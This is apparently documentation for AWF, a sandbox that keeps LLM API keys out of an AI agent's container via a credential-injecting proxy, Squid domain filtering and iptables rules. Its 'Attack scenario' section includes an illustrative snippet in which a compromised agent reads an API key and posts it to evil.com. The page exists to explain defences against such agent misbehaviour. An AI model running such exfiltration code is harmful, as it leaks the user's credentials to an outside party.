---
title: Authentication Architecture
description: How AWF isolates LLM API tokens using a multi-container credential separation architecture.
---

AWF implements a multi-layered security architecture to protect LLM API authentication tokens while providing transparent proxying for AI agent calls. This document explains the complete authentication flow, token isolation mechanisms, and network routing for both OpenAI/Codex and Anthropic/Claude APIs.

:::note
Both OpenAI/Codex and Anthropic/Claude use identical credential isolation architecture. API keys are held exclusively in the api-proxy sidecar container (never in the agent container), and both providers route through the same Squid proxy for domain filtering. The only differences are the port numbers (10000 for OpenAI, 10001 for Anthropic) and authentication header formats (`Authorization: Bearer` vs `x-api-key`).
:::

## Architecture components

AWF uses a **3-container architecture** when API proxy mode is enabled:

1. **Squid Proxy Container** (`172.30.0.10`) — L7 HTTP/HTTPS domain filtering
2. **API Proxy Sidecar Container** (`172.30.0.30`) — credential injection and isolation
3. **Agent Execution Container** (`172.30.0.20`) — user command execution environment

```
┌─────────────────────────────────────────────────────────────────┐
│ HOST MACHINE                                                     │
│                                                                  │
│  AWF CLI reads environment:                                      │
│  - ANTHROPIC_API_KEY=sk-ant-...                                 │
│  - OPENAI_API_KEY=sk-...                                        │
│                                                                  │
│  Passes keys only to api-proxy container                         │
└────────────────────┬─────────────────────────────────────────────┘
                     │
                     ├─────────────────────────────────────┐
                     │                                     │
                     ▼                                     ▼
┌──────────────────────────────────┐       ┌──────────────────────────────────┐
│ API Proxy Container              │       │ Agent Container                  │
│ 172.30.0.30                      │       │ 172.30.0.20                      │
│                                  │       │                                  │
│ Environment:                     │       │ Environment:                     │
│ ✓ OPENAI_API_KEY=sk-...         │       │ ✗ No ANTHROPIC_API_KEY          │
│ ✓ ANTHROPIC_API_KEY=sk-ant-...  │       │ ✗ No OPENAI_API_KEY             │
│ ✓ HTTP_PROXY=172.30.0.10:3128   │       │ ✓ ANTHROPIC_BASE_URL=            │
│ ✓ HTTPS_PROXY=172.30.0.10:3128  │       │     http://172.30.0.30:10001    │
│                                  │       │ ✓ OPENAI_BASE_URL=               │
│ Ports:                           │       │     http://172.30.0.30:10000/v1 │
│ - 10000 (OpenAI proxy)          │◄──────│ ✓ GITHUB_TOKEN=ghp_...           │
│ - 10001 (Anthropic proxy)       │       │   (protected by one-shot-token)  │
│                                  │       │                                  │
│ Injects auth headers:            │       │ User command execution:          │
│ - x-api-key: sk-ant-...         │       │   claude-code, copilot, etc.     │
│ - Authorization: Bearer sk-...   │       └──────────────────────────────────┘
└────────────────┬─────────────────┘
                 │
                 ▼
┌──────────────────────────────────┐
│ Squid Proxy Container            │
│ 172.30.0.10:3128                 │
│                                  │
│ Domain whitelist enforcement:    │
│ ✓ api.anthropic.com             │
│ ✓ api.openai.com                │
│ ✗ *.exfiltration.com (blocked)  │
│                                  │
└────────────────┬─────────────────┘
                 │
                 ▼
         Internet (api.anthropic.com)
```

## Token flow: step by step

### 1. Token sources and initial handling

**Source:** `src/cli.ts`

When AWF is invoked with `--enable-api-proxy`:

```bash
export ANTHROPIC_API_KEY="sk-ant-..."
export OPENAI_API_KEY="sk-..."

sudo awf --enable-api-proxy --allow-domains api.anthropic.com \
  "claude-code --prompt 'write hello world'"
```

The CLI reads API keys from the **host environment** at startup and passes them to the Docker Compose configuration.

### 2. Docker Compose configuration

**Source:** `src/docker-manager.ts`

AWF generates a Docker Compose configuration with three services:

#### API proxy service configuration

```yaml
api-proxy:
  environment:
    # API keys passed ONLY to this container
    - ANTHROPIC_API_KEY=sk-ant-...
    - OPENAI_API_KEY=sk-...
    # Routes all traffic through Squid
    - HTTP_PROXY=http://172.30.0.10:3128
    - HTTPS_PROXY=http://172.30.0.10:3128
  networks:
    awf-net:
      ipv4_address: 172.30.0.30
```

#### Agent service configuration

```yaml
agent:
  environment:
    # NO API KEYS - only base URLs pointing to api-proxy
    - ANTHROPIC_BASE_URL=http://172.30.0.30:10001
    - OPENAI_BASE_URL=http://172.30.0.30:10000/v1
    # GitHub token for MCP servers (protected separately)
    - GITHUB_TOKEN=ghp_...
  networks:
    awf-net:
      ipv4_address: 172.30.0.20
```

:::danger[Security design]
API keys are intentionally excluded from the agent container environment. When `--enable-api-proxy` is set, `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, and related keys are added to the excluded environment variables list in `docker-manager.ts`.
:::

### 3. API proxy: credential injection layer

**Source:** `containers/api-proxy/server.js`

The api-proxy container runs two HTTP servers:

#### Port 10000: OpenAI proxy

```javascript
// Stripped headers — never forwarded from client
const STRIPPED_HEADERS = new Set([
  'host', 'authorization', 'proxy-authorization',
  'x-api-key', 'forwarded', 'via',
]);

// OpenAI proxy handler
http.createServer((req, res) => {
  proxyRequest(req, res, 'api.openai.com', {
    'Authorization': `Bearer ${OPENAI_API_KEY}`,
  });
});
```

#### Port 10001: Anthropic proxy

```javascript
// Anthropic proxy handler
http.createServer((req, res) => {
  const anthropicHeaders = { 'x-api-key': ANTHROPIC_API_KEY };
  // Only set anthropic-version as default; preserve agent-provided version
  if (!req.headers['anthropic-version']) {
    anthropicHeaders['anthropic-version'] = '2023-06-01';
  }
  proxyRequest(req, res, 'api.anthropic.com', anthropicHeaders);
});
```

The `proxyRequest` function copies incoming headers, strips sensitive/proxy headers, injects the authentication headers, and forwards the request to the target API through Squid using `HttpsProxyAgent`.

:::caution
The proxy strips any authentication headers sent by the agent and only uses the key from its own environment. This prevents a compromised agent from injecting malicious credentials.
:::

### 4. Agent container: SDK transparent redirection

The agent container sees these environment variables:

```bash
ANTHROPIC_BASE_URL=http://172.30.0.30:10001
OPENAI_BASE_URL=http://172.30.0.30:10000/v1
```

These are standard environment variables recognized by the official SDKs:
- Anthropic Python SDK (`anthropic`)
- Anthropic TypeScript SDK (`@anthropic-ai/sdk`)
- OpenAI Python SDK (`openai`)
- OpenAI Node.js SDK (`openai`)
- Claude Code CLI
- Codex CLI

When the agent code makes an API call:

**Example 1: Anthropic/Claude**

```python
import anthropic

client = anthropic.Anthropic()
# SDK reads ANTHROPIC_BASE_URL from environment
# Sends request to http://172.30.0.30:10001 instead of api.anthropic.com

response = client.messages.create(
    model="claude-sonnet-4",
    messages=[{"role": "user", "content": "Hello"}]
)
```

**Example 2: OpenAI/Codex**

```python
import openai

client = openai.OpenAI()
# SDK reads OPENAI_BASE_URL from environment
# Sends request to http://172.30.0.30:10000/v1 instead of api.openai.com

response = client.chat.completions.create(
    model="gpt-4",
    messages=[{"role": "user", "content": "Hello"}]
)
```

The SDKs automatically use the base URL without requiring any code changes.

### 5. Network routing: iptables rules

**Source:** `containers/agent/setup-iptables.sh`

Special iptables rules ensure proper routing for the api-proxy:

```bash
# Allow direct access to api-proxy (bypass NAT redirection)
if [ -n "$AWF_API_PROXY_IP" ]; then
  iptables -t nat -A OUTPUT -d "$AWF_API_PROXY_IP" -j RETURN
fi

# Accept TCP traffic to api-proxy
iptables -A OUTPUT -p tcp -d "$AWF_API_PROXY_IP" -j ACCEPT
```

Without the NAT `RETURN` rule, traffic to `172.30.0.30` would be redirected to Squid via the DNAT rules, creating a routing loop.

**Traffic flow for Anthropic/Claude:**

1. Agent SDK makes HTTP request to `172.30.0.30:10001`
2. iptables allows direct TCP connection (NAT `RETURN` rule)
3. API proxy receives request on port 10001
4. API proxy injects `x-api-key: sk-ant-...` header
5. API proxy forwards to `api.anthropic.com` via Squid (using `HttpsProxyAgent`)
6. Squid enforces domain whitelist (only `api.anthropic.com` allowed)
7. Squid forwards to real API endpoint
8. Response flows back: API → Squid → api-proxy → agent

**Traffic flow for OpenAI/Codex:**

1. Agent SDK makes HTTP request to `172.30.0.30:10000/v1`
2. iptables allows direct TCP connection (NAT `RETURN` rule)
3. API proxy receives request on port 10000
4. API proxy injects `Authorization: Bearer sk-...` header
5. API proxy forwards to `api.openai.com` via Squid (using `HttpsProxyAgent`)
6. Squid enforces domain whitelist (only `api.openai.com` allowed)
7. Squid forwards to real API endpoint
8. Response flows back: API → Squid → api-proxy → agent

### 6. Squid proxy: domain filtering

The api-proxy container routes all outbound traffic through Squid via its `HTTP_PROXY`/`HTTPS_PROXY` environment variables:

```yaml
environment:
  HTTP_PROXY: http://172.30.0.10:3128
  HTTPS_PROXY: http://172.30.0.10:3128
```

Squid's domain whitelist ACLs control which API domains the sidecar can reach. For example, if only `api.anthropic.com` is whitelisted, the sidecar can only connect to that domain — even if a compromised sidecar tried to connect to a malicious domain, Squid would block it.

:::note
The api-proxy connects to the real APIs (e.g., `api.openai.com`) over standard HTTPS (port 443) through Squid. Ports 10000 and 10001 are only used for internal agent-to-proxy communication within the Docker network.
:::

## Additional token protection mechanisms

### One-shot token library

**Source:** `containers/agent/one-shot-token/`

While API keys don't exist in the agent container, other tokens (like `GITHUB_TOKEN`) do. AWF uses an `LD_PRELOAD` library to protect these:

```c
// Intercept getenv() calls
char* getenv(const char* name) {
  if (is_protected_token(name)) {
    // First access: return value and cache it
    char* value = real_getenv(name);
    if (value) {
      cache_token(name, value);
      unsetenv(name);  // Remove from environment
    }
    return value;
  }
  return real_getenv(name);
}

// Subsequent accesses return cached value
// /proc/self/environ no longer shows the token
```

**Protected tokens by default:**
- `ANTHROPIC_API_KEY`, `CLAUDE_API_KEY` (though not passed to agent when api-proxy is enabled)
- `OPENAI_API_KEY`, `OPENAI_KEY`
- `GITHUB_TOKEN`, `GH_TOKEN`, `COPILOT_GITHUB_TOKEN`
- `GITHUB_API_TOKEN`, `GITHUB_PAT`, `GH_ACCESS_TOKEN`
- `CODEX_API_KEY`

### Entrypoint token cleanup

**Source:** `containers/agent/entrypoint.sh`

The entrypoint (PID 1) runs the agent command in the background, then unsets sensitive tokens from its own environment after a 5-second grace period:

```bash
unset_sensitive_tokens() {
  local SENSITIVE_TOKENS=(
    "COPILOT_GITHUB_TOKEN" "GITHUB_TOKEN" "GH_TOKEN"
    "GITHUB_API_TOKEN" "GITHUB_PAT" "GH_ACCESS_TOKEN"
    "GITHUB_PERSONAL_ACCESS_TOKEN"
    "OPENAI_API_KEY" "OPENAI_KEY"
    "ANTHROPIC_API_KEY" "CLAUDE_API_KEY" "CLAUDE_CODE_OAUTH_TOKEN"
    "CODEX_API_KEY"
  )

  for token in "${SENSITIVE_TOKENS[@]}"; do
    if [ -n "${!token}" ]; then
      unset "$token"
    fi
  done
}

# Run agent in background, wait for it to cache tokens, then unset
capsh --drop=cap_net_admin -- -c "exec gosu awfuser $COMMAND" &
AGENT_PID=$!
sleep 5
unset_sensitive_tokens
wait $AGENT_PID
```

This prevents tokens from being visible in `/proc/1/environ` after the agent starts.

## Security properties

### Credential isolation

**Primary security guarantee:** API keys **never exist** in the agent container environment.

- Agent code cannot read API keys via `getenv()` or `os.getenv()`
- API keys are not visible in `/proc/self/environ` or `/proc/*/environ`
- Compromised agent code cannot exfiltrate API keys (they don't exist)
- Only the api-proxy container has access to API keys

### Network isolation

**Defense in depth:**

1. **Layer 1:** Agent cannot make direct internet connections (iptables blocks non-whitelisted traffic)
2. **Layer 2:** Agent can only reach api-proxy IP (`172.30.0.30`) for API calls
3. **Layer 3:** API proxy routes all traffic through Squid (enforced via `HTTP_PROXY` env)
4. **Layer 4:** Squid enforces the domain whitelist (only `api.anthropic.com`, `api.openai.com`)
5. **Layer 5:** Host-level iptables provide additional egress control

**Attack scenario: what if the agent tries to bypass the proxy?**

```python
# Compromised agent tries to exfiltrate API key
import os, requests

# Attempt 1: Try to read API key
api_key = os.getenv("ANTHROPIC_API_KEY")
# Result: None (key doesn't exist in agent environment)

# Attempt 2: Try to connect to malicious domain
requests.post("https://evil.com/exfiltrate", data={"key": api_key})
# Result: iptables blocks connection (evil.com not in whitelist)

# Attempt 3: Try to bypass Squid
import socket
sock = socket.socket()
sock.connect(("evil.com", 443))
# Result: iptables blocks connection (must go through Squid)
```

All attempts fail due to the multi-layered defense.

### Capability restrictions

**API proxy container:**

```yaml
security_opt:
  - no-new-privileges:true
cap_drop:
  - ALL
mem_limit: 512m
pids_limit: 100
```

Even if exploited, the api-proxy has no elevated privileges and limited resources.

**Agent container:**

- Starts with `CAP_NET_ADMIN` (and `CAP_SYS_ADMIN`, `CAP_SYS_CHROOT` in chroot mode) for iptables and filesystem setup
- Drops these capabilities via `capsh --drop=...` before executing the user command
- Prevents malicious code from modifying firewall rules

## Configuration requirements

### Enabling API proxy mode

**Example 1: Using with Claude Code**

```bash
export ANTHROPIC_API_KEY="sk-ant-api03-..."

sudo awf --enable-api-proxy \
    --allow-domains api.anthropic.com \
    "claude-code --prompt 'Hello world'"
```

**Example 2: Using with Codex**

```bash
export OPENAI_API_KEY="sk-..."

sudo awf --enable-api-proxy \
    --allow-domains api.openai.com \
    "codex --prompt 'Hello world'"
```

**Example 3: Using both providers**

```bash
export ANTHROPIC_API_KEY="sk-ant-api03-..."
export OPENAI_API_KEY="sk-..."

sudo awf --enable-api-proxy \
    --allow-domains api.anthropic.com,api.openai.com \
    "your-multi-llm-agent"
```

### Domain whitelist

When using api-proxy, you must allow the API domains:

```bash
--allow-domains api.anthropic.com,api.openai.com
```

Without these, Squid blocks the api-proxy's outbound connections.

### NO_PROXY configuration

**Source:** `src/docker-manager.ts`

The agent container's `NO_PROXY` variable includes the api-proxy IP so that agent-to-proxy communication bypasses Squid:

```bash
NO_PROXY=localhost,127.0.0.1,172.30.0.30
```

This ensures:
- Local MCP servers (stdio-based) can communicate via localhost
- The agent can reach api-proxy directly without going through Squid
- Container-to-container communication works properly

## Comparison: with vs without API proxy

### Without API proxy (direct authentication)

```
┌─────────────────┐
│ Agent Container │
│                 │
│ Environment:    │
│ ✓ ANTHROPIC_API_KEY=sk-ant-... (VISIBLE)
│                 │
│ Risk: Token     │
│ visible in      │
│ /proc/environ   │
└────────┬────────┘
         │
         ▼
    Squid Proxy
         │
         ▼
  api.anthropic.com
```

**Security risk:** If the agent is compromised, the attacker can read the API key from environment variables.

### With API proxy (credential isolation)

```
┌─────────────────┐     ┌────────────────┐
│ Agent Container │────▶│ API Proxy      │
│                 │     │                │
│ Environment:    │     │ Environment:   │
│ ✗ No API key    │     │ ✓ ANTHROPIC_API_KEY=sk-ant-...
│ ✓ BASE_URL=     │     │ (ISOLATED)     │
│   172.30.0.30   │     │                │
└─────────────────┘     └────────┬───────┘
                                 │
                                 ▼
                            Squid Proxy
                                 │
                                 ▼
                          api.anthropic.com
```

**Security improvement:** A compromised agent cannot access API keys — they don't exist in the agent environment.

## Key files reference

| File | Purpose |
|------|---------|
| `src/cli.ts` | CLI reads API keys from host environment |
| `src/docker-manager.ts` | Docker Compose generation, token routing, env var exclusion |
| `containers/api-proxy/server.js` | API proxy implementation (credential injection, header stripping) |
| `containers/agent/setup-iptables.sh` | iptables rules for api-proxy routing |
| `containers/agent/entrypoint.sh` | Entrypoint token cleanup, capability drop |
| `containers/agent/api-proxy-health-check.sh` | Pre-flight credential isolation verification |
| `containers/agent/one-shot-token/` | LD_PRELOAD library for token protection |
| `docs/api-proxy-sidecar.md` | User-facing API proxy documentation |
| `docs/token-unsetting-fix.md` | Token cleanup implementation details |

## Summary

AWF implements **credential isolation** through architectural separation:

1. **API keys live in api-proxy container only** (never in agent environment)
2. **Agent uses standard SDK environment variables** (`*_BASE_URL`) to redirect traffic
3. **API proxy injects credentials** and routes through Squid
4. **Squid enforces the domain whitelist** (only allowed API domains)
5. **iptables enforces network isolation** (agent cannot bypass proxy)
6. **Multiple token cleanup mechanisms** protect other credentials (GitHub tokens, etc.)

This architecture provides **transparent operation** (SDKs work without code changes) while maintaining **strong security** (compromised agent cannot steal API keys).

## Related documentation

- [API Proxy Sidecar](./api-proxy-sidecar.md) — user-facing guide for enabling the API proxy
- [Security](./security.md) — overall security model
- [Architecture](./architecture.md) — overall system architecture
- [Token Unsetting Fix](./token-unsetting-fix.md) — token cleanup implementation details
- [Environment Variables](./environment.md) — environment variable configuration
